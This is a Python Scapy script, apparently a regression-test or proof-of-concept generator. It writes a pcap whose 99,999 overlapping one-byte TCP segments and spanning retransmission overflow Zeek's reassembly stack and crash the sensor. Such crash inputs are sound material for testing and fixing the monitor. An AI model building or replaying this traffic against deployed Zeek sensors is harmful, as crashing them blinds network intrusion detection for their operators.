#!/usr/bin/env python3
"""
Generate a pcap that exhausts Zeek's TCP reassembly call stack via overlapping blocks.

Creates a TCP connection where 99,999 one-byte segments are buffered out of order,
then a single large retransmission spanning all of them triggers recursive
DataBlockList::Insert() calls that overflow an 8 MiB process stack.

Originally generated by gpt-5.6-sol, rewritten with Scapy by Claude Opus 4.6 (Anthropic)
"""

import gzip
from pathlib import Path

from scapy.all import IP, TCP, Ether, Raw, wrpcap

OUTPUT = Path(__file__).with_suffix(".gz")

CLIENT = "192.0.2.1"
SERVER = "192.0.2.2"
SPORT = 31337
DPORT = 80
CSEQ = 1000
SSEQ = 2000
OVERLAP_LENGTH = 100_000
BASE_TS = 1_700_000_000.0


def client_pkt(seq, ack, flags, payload=b"", ts=0.0):
    p = (
        Ether(src="00:11:22:33:44:55", dst="66:77:88:99:aa:bb")
        / IP(src=CLIENT, dst=SERVER)
        / TCP(sport=SPORT, dport=DPORT, flags=flags, seq=seq, ack=ack)
    )
    if payload:
        p = p / Raw(payload)
    p.time = BASE_TS + ts
    return p


def server_pkt(seq, ack, flags, payload=b"", ts=0.0):
    p = (
        Ether(src="66:77:88:99:aa:bb", dst="00:11:22:33:44:55")
        / IP(src=SERVER, dst=CLIENT)
        / TCP(sport=DPORT, dport=SPORT, flags=flags, seq=seq, ack=ack)
    )
    if payload:
        p = p / Raw(payload)
    p.time = BASE_TS + ts
    return p


def main():
    packets = []

    # Three-way handshake
    packets.append(client_pkt(CSEQ, 0, "S", ts=0.000))
    packets.append(server_pkt(SSEQ, CSEQ + 1, "SA", ts=0.001))
    packets.append(client_pkt(CSEQ + 1, SSEQ + 1, "A", ts=0.002))

    # Initial data byte and its acknowledgment
    packets.append(client_pkt(CSEQ + 1, SSEQ + 1, "PA", b"A", ts=0.003))
    packets.append(server_pkt(SSEQ + 1, CSEQ + 2, "A", ts=0.004))

    # Buffer 99,999 one-byte segments at increasing offsets (out of order relative
    # to the gap at sequence CSEQ+2). Each is one byte starting at CSEQ+3 onward.
    for i in range(OVERLAP_LENGTH - 1):
        rel_seq = CSEQ + 3 + i
        ts = 0.005 + i * 0.000001
        packets.append(client_pkt(rel_seq, SSEQ + 1, "PA", b"X", ts=ts))

    # Large retransmission spanning all buffered blocks, split into segments
    # that fit within IP's 65535-byte limit. This triggers recursive overlap
    # resolution in DataBlockList::Insert().
    MAX_SEG = 60_000
    retrans_offset = 0
    seg_idx = 0
    while retrans_offset < OVERLAP_LENGTH:
        chunk = min(MAX_SEG, OVERLAP_LENGTH - retrans_offset)
        packets.append(
            client_pkt(
                CSEQ + 2 + retrans_offset,
                SSEQ + 1,
                "PA",
                b"Y" * chunk,
                ts=1.000 + seg_idx * 0.000001,
            )
        )
        retrans_offset += chunk
        seg_idx += 1

    with gzip.GzipFile(OUTPUT, "wb", mtime=0) as f:
        wrpcap(f, packets)

    print(f"Wrote {len(packets)} packets to {OUTPUT}")


if __name__ == "__main__":
    main()
